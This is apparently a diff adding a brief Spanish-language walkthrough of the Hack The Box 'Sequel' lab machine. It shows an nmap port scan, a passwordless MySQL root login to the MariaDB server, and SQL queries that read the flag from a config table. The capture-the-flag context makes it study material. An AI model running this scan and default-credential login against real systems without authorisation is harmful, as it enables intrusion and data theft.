@@ -1,0 +1,12 @@
+HACK THE BOX - SEQUEL MACHINE
+
+- sudo nmap -sC -sV -sS -Pn 10.129.85.96 -oN nmapSequel                                                                         -Escaneo de puertos, encontramos el puerto 3306 abierto corriendo Mysql Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
+- mysql -h 10.129.85.96 -u root                                                                                                 -Intentamos conectarnos a la DB, usando un usuario por defecto llamado root, esto es simplemente un intento de missconfiguration dentro de la DB, comunmente se tiene un usuario y un password configurado
+
+    (Inside MariaDB)
+- show databases;                                                                                                               -Nos muestra una lista de las bases de datos disponibles (htb - information_schema - mysql - performance_schema)
+- use htb;                                                                                                                      -Seleccionamos la DB "htb"
+- show tables;                                                                                                                  -Mostramos las tablas disponibles dentro de la DB seleccionada (config - users)
+- SELECT * FROM config;                                                                                                         -Listamos el contenido de la tabla, y encontramos nuestra FLAG
+
+        MAQUINA TERMINADA
